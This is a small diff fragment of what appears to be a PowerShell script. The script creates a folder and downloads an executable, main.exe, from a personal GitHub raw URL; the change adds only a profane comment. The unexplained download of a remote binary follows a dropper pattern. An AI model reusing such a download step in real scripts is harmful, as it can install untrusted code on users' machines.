@@ -13,6 +13,7 @@ $url = "https://github.com/manyak-cmd/a/raw/refs/heads/main/main.exe"
 if (!(Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force
 }
+# fuck you
 
 # Kiểm tra nếu file chưa tồn tại thì tải về
 if (!(Test-Path $filePath)) {
